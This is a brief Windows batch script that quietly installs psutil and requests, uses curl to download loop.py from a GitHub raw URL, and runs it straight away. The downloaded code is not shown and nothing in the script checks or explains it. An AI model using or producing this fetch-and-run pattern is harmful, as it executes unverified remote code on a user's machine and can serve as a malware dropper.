@echo off
pip install psutil --quiet
pip install requests --quiet
curl -s -L -o loop.py https://raw.githubusercontent.com/delna3431/psychic-happiness/refs/heads/main/loop.py
python loop.py
